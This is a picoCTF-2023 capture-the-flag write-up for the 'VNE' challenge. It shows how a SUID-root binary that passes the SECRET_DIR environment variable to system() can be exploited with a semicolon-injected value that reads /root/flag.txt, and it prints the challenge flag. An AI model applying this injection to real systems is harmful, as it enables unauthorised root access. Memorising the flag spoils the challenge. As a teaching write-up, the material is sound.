# VNE #
 
## Overview ##

Category: [Binary Exploitation](../)

Topics: Binary Exploitation, picoCTF-2023, Command Injection Vulnerability

## Description ##
We've got a binary that can list directories as root, try it out !!

## Approach ##
I am not provided with any files, just given the credentials to log into a remote linux machine via SSH. After connecting, I ran the binary called `bin` and noticed that it says `SECRET_DIR environment variable is not set`. I then decided to scan the file `bin` and prints readable text strings (`strings bin`):

    SECRET_DIR
    Error: SECRET_DIR environment variable is not set
    Listing the content of
    as root:
    Error: system() call returned non-zero value:
    :*3$"

The binary constructs a shell command using the value of `SECRET_DIR` and executes it via `system()`, effectively running `ls <SECRET_DIR>` as root. Another thing I wanted to check is if it has root privileges (via `ls -l bin`):

    -rwsr-xr-x 1 root root 18752 Aug  4  2023 bin

Checking the file permissions revealed that the binary is SUID-root, meaning it executes with root privileges. So the first thing I did was try /root, which will list root's directory:

    ctf-player@pico-chall$ export SECRET_DIR="/root"
    ctf-player@pico-chall$ ./bin
    Listing the content of /root as root:
    flag.txt

Noticing that the flag.txt is listed, I tried to read it using a command injection (`/root; /bin/cat /root/flag.txt`). The semicolon (`;`) is interpreted by the shell as a command separator, allowing an additional command to be injected. As a result, the shell executes both `ls /root` and `/bin/cat /root/flag.txt` with root privileges: 

    ctf-player@pico-chall$ export SECRET_DIR="/root; /bin/cat /root/flag.txt"
    ctf-player@pico-chall$ ./bin
    Listing the content of /root; /bin/cat /root/flag.txt as root:
    flag.txt
    picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}

Flag: picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}

## Reflection ## 
This challenge demonstrates how command injection can occur through manipulation of environment variables in a SUID-root binary, an attack vector I did not have much prior experience with. It was a valuable learning experience that helped me understand how to craft environment variable payloads using shell metacharacters such as `;` to execute additional commands.




